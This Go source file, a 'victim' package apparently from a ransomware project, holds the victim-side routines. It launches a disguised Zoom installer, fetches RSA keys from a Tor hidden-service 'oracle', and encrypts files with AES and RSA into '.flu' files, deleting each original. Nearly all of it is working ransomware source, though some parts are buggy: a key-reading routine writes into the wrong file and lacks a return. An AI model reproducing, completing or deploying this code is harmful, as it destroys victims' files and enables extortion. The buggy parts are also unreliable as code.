package victim

import (
    "os"
    "io"
    "io/ioutil"
    "encoding/binary"
    "crypto/cipher"
    "crypto/rand"
    "crypto/rsa"
    "crypto/aes"
    "time"

    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
    "github.com/sug0/sr-ransomware/go/net/ratelimit"
)

/*
TODO
-- BUNDLE CRYPTO SERVICE
-- BUNDLE TOR
-- RUN TOR EXECUTABLE
*/

func RunZoomInstaller() error {
    z := exe.NewZoom(zoomInstaller)
    return errors.WrapIfNotNil(pkg, "error during zoom installation", z.Run())
}

func DownloadKeysFromTor() error {
    // create work dir
    err := os.Mkdir(workDir)
    if err != nil && !os.IsExist(err) {
        return errors.Wrap(pkg, "failed to create work dir", err)
    }

    // 32 ms --> limit to about 128 KiB/s
    client := ratelimit.NewHTTPClient(32 * time.Millisecond, true)

    rsp, err := client.Get(hiddenServiceOracle)
    if err != nil {
        return errors.Wrap(pkg, "failed to query hidden service oracle", err)
    }
    defer rsp.Body.Close()

    // read public key
    fPub, err := os.Create(victimPublicKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to create pubkey file", err)
    }
    defer fPub.Close()

    var pubKeyLen int64

    err = binary.Read(rsp.Body, binary.BigEndian, &pubKeyLen)
    if err != nil {
        return errors.Wrap(pkg, "failed to read pubkey len", err)
    }

    _, err = io.Copy(fPub, &io.LimitedReader{R: rsp.Body, N: pubKeyLen})
    if err != nil {
        return errors.Wrap(pkg, "failed to read pubkey", err)
    }

    // read secret key
    fSec, err := os.Create(victimSecretKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to create seckey file", err)
    }
    defer fSec.Close()

    var secKeyLen int64

    err = binary.Read(rsp.Body, binary.BigEndian, &secKeyLen)
    if err != nil {
        return errors.Wrap(pkg, "failed to read seckey len", err)
    }

    _, err = io.Copy(fPub, &io.LimitedReader{R: rsp.Body, N: pubKeyLen})
    if err != nil {
        return errors.Wrap(pkg, "failed to read pubkey", err)
    }
}

func ImportPublicKey() (*rsa.PublicKey, error) {
    pkData, err := ioutil.ReadFile(victimPublicKey)
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to read RSA public key", err)
    }
    pk, err := util.ImportPEMPublicKeyRSA(pkData)
    return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
}

// Encrypt a file.
func EncryptFile(pk *rsa.PublicKey, path string) error {
    err := encryptFile(pk, path)
    if err != nil {
        return err
    }

    // remove original file
    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
}

func encryptFile(pk *rsa.PublicKey, path string) error {
    // new aes key
    aesKey, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES key", err)
    }
    aesIV, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES IV", err)
    }
    aesBlock, _ := aes.NewCipher(aesKey)
    aesStream := cipher.NewCTR(aesBlock, aesIV)

    // load files
    fOriginal, err := os.Open(path)
    if err != nil {
        return errors.Wrap(pkg, "failed to open file", err)
    }
    defer fOriginal.Close()

    fEncrypted, err := os.Create(path + ".flu")
    if err != nil {
        return errors.Wrap(pkg, "failed to create file", err)
    }
    defer fEncrypted.Close()

    // write magic
    _, err = io.WriteString(fEncrypted, "JUSTA FLU BRO :)")
    if err != nil {
        return errors.Wrap(pkg, "failed to write magic", err)
    }

    // write encrypted AES key
    encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, pk, append(aesIV, aesKey...))
    if err != nil {
        return errors.Wrap(pkg, "failed encrypt AES key", err)
    }
    _, err = fEncrypted.Write(encryptedKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to write encrypted AES key", err)
    }

    // write encrypted file
    info, err := fOriginal.Stat()
    if err != nil {
        return errors.Wrap(pkg, "failed to stat file", err)
    }
    padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
    stream := cipher.StreamWriter{S: aesStream, W: fEncrypted}
    _, err = io.Copy(stream, fOriginal)
    if err == nil {
        _, err = stream.Write(padding)
    }
    return errors.WrapIfNotNil(pkg, "failed to encrypte file with AES", err)
}